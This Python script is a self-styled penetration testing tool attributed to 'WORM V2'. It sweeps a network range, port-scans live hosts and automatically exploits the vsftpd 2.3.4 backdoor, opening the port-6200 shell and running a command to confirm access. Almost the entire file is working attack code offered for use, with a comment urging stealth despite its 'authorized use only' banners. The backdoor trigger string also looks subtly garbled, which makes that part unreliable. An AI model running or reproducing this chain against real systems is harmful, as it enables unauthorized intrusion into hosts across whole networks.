#!/usr/bin/env python3
"""
rcell_hack.py - Network Penetration Testing Tool for Authorized Use Only
Author: WORM V2
Description: This tool performs network reconnaissance, vulnerability scanning, and exploitation
             against authorized targets. It is designed for penetration testing and security
             research purposes only. Unauthorized use is illegal and unethical.
"""

import socket
import subprocess
import sys
import threading
import time
from typing import List, Tuple, Optional
import ipaddress

# =========================
# CONFIGURATION SECTION
# =========================
TIMEOUT = 3
THREAD_COUNT = 100
PORTS_TO_SCAN = [21, 22, 23, 25, 80, 110, 139, 443, 445, 3306, 3389, 5900, 8080]
# Common FTP backdoor port for vsftpd 2.3.4
FTP_BACKDOOR_PORT = 6200

# =========================
# NETWORK FUNCTIONS
# =========================

def ping_host(ip: str) -> bool:
    """
    Ping a host to check if it's alive.
    Uses system ping command for reliability.
    """
    try:
        # Use -c 1 for Linux, -n 1 for Windows
        param = '-n' if sys.platform.lower() == 'win32' else '-c'
        command = ['ping', param, '1', '-w', '2', ip]
        output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        return output.returncode == 0
    except Exception:
        return False

def scan_port(ip: str, port: int) -> bool:
    """
    Scan a specific port on a host.
    Returns True if port is open, False otherwise.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def service_detection(ip: str, port: int) -> str:
    """
    Attempt to detect service running on a port.
    Returns service name or 'unknown'.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, port))
        # Send a generic request to elicit response
        sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        
        # Simple service detection based on banner
        if 'SSH' in banner:
            return 'SSH'
        elif 'HTTP' in banner:
            return 'HTTP'
        elif 'FTP' in banner:
            return 'FTP'
        elif 'SMTP' in banner:
            return 'SMTP'
        elif banner:
            return banner.split()[0] if banner else 'unknown'
        return 'unknown'
    except Exception:
        return 'unknown'

def exploit_vsftpd_backdoor(ip: str) -> bool:
    """
    Attempt to exploit vsftpd 2.3.4 backdoor.
    Returns True if exploitation successful, False otherwise.
    """
    try:
        # First, check if FTP port 21 is open
        if not scan_port(ip, 21):
            return False
            
        # Connect to FTP and send the malicious username
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, 21))
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # Check if it's vsftpd (simple check)
        if 'vsftpd' not in banner.lower():
            sock.close()
            return False
            
        # Send the backdoor trigger username
        sock.send(b'USER :):)rn\v\n')
        sock.recv(1024)
        sock.send(b'PASS whatever\n')
        sock.recv(1024)
        sock.close()
        
        # Now check if the backdoor port (6200) is open
        time.sleep(1)  # Wait for backdoor to activate
        if scan_port(ip, FTP_BACKDOOR_PORT):
            # Attempt to connect to the shell
            shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_sock.settimeout(TIMEOUT)
            shell_sock.connect((ip, FTP_BACKDOOR_PORT))
            # Send a test command
            shell_sock.send(b'id\n')
            output = shell_sock.recv(1024).decode('utf-8', errors='ignore')
            shell_sock.close()
            return 'uid=' in output  # Successful if we get user id
        return False
    except Exception as e:
        # Silently fail - exploitation attempts should be stealthy
        return False

# =========================
# MAIN EXECUTION
# =========================

def network_scan(network: str) -> List[str]:
    """
    Scan a network for live hosts using ping sweep.
    Returns list of live IP addresses.
    """
    live_hosts = []
    try:
        net = ipaddress.IPv4Network(network, strict=False)
    except ValueError:
        print(f"[!] Invalid network address: {network}")
        return live_hosts
    
    print(f"[*] Scanning network {network} for live hosts...")
    
    def ping_worker(ip):
        if ping_host(str(ip)):
            live_hosts.append(str(ip))
            print(f"[+] Host alive: {ip}")
    
    threads = []
    for ip in net.hosts():
        while len(threads) >= THREAD_COUNT:
            # Clean up finished threads
            threads = [t for t in threads if t.is_alive()]
            time.sleep(0.01)
        
        t = threading.Thread(target=ping_worker, args=(ip,))
        t.start()
        threads.append(t)
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    return live_hosts

def port_scan_host(ip: str) -> List[Tuple[int, str]]:
    """
    Scan ports on a single host.
    Returns list of (port, service) tuples for open ports.
    """
    open_ports = []
    
    def scan_worker(port):
        if scan_port(ip, port):
            service = service_detection(ip, port)
            open_ports.append((port, service))
            print(f"    [+] {ip}:{port}/open - {service}")
    
    threads = []
    for port in PORTS_TO_SCAN:
        while len(threads) >= THREAD_COUNT:
            threads = [t for t in threads if t.is_alive()]
            time.sleep(0.01)
        
        t = threading.Thread(target=scan_worker, args=(port,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    return open_ports

def exploit_host(ip: str) -> bool:
    """
    Attempt to exploit known vulnerabilities on a host.
    Returns True if any exploitation succeeded.
    """
    print(f"[*] Attempting exploitation on {ip}...")
    
    # Try vsftpd backdoor
    if exploit_vsftpd_backdoor(ip):
        print(f"[!!] SUCCESS: vsftpd 2.3.4 backdoor exploited on {ip}")
        return True
    
    # Add more exploitation attempts here as needed
    # Example: check for EternalBlue, SambaCry, etc.
    
    return False

def main():
    """
    Main function - orchestrates the penetration test.
    """
    if len(sys.argv) != 2:
        print("Usage: python3 rcell_hack.py <network/CIDR>")
        print("Example: python3 rcell_hack.py 192.168.1.0/24")
        print("\n[!] WARNING: This tool is for authorized penetration testing only.")
        print("[!] Ensure you have explicit permission before scanning any network.")
        sys.exit(1)
    
    target_network = sys.argv[1]
    
    print("="*60)
    print("WORM V2 - Network Penetration Testing Tool")
    print("Authorized Use Only")
    print("="*60)
    
    # Step 1: Network Discovery
    live_hosts = network_scan(target_network)
    print(f"\n[*] Discovery complete. Found {len(live_hosts)} live host(s).")
    
    if not live_hosts:
        print("[!] No live hosts found. Exiting.")
        return
    
    # Step 2: Port Scanning and Service Detection
    print("\n[*] Starting port scanning on live hosts...")
    host_results = {}
    for host in live_hosts:
        print(f"\n[*] Scanning host: {host}")
        open_ports = port_scan_host(host)
        host_results[host] = open_ports
        if open_ports:
            print(f"[*] Host {host} has {len(open_ports)} open port(s).")
        else:
            print(f"[*] Host {host} has no open ports from our scan list.")
    
    # Step 3: Exploitation Attempts
    print("\n[*] Starting exploitation attempts...")
    exploited_hosts = []
    for host in live_hosts:
        if exploit_host(host):
            exploited_hosts.append(host)
    
    # Step 4: Reporting
    print("\n" + "="*60)
    print("PENETRATION TEST RESULTS")
    print("="*60)
    print(f"Target Network: {target_network}")
    print(f"Live Hosts Found: {len(live_hosts)}")
    print(f"Hosts Exploited: {len(exploited_hosts)}")
    
    if exploited_hosts:
        print("\n[!!] EXPLOITED HOSTS:")
        for host in exploited_hosts:
            print(f"    - {host}")
    
    print("\n[*] Detailed Scan Results:")
    for host, ports in host_results.items():
        print(f"\nHost: {host}")
        if ports:
            for port, service in ports:
                print(f"  {port}/tcp open  {service}")
        else:
            print("  No open ports detected in common port list.")
    
    print("\n[*] Penetration test complete.")
    print("[!] Remember: All actions should be authorized and legal.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] User interrupted. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)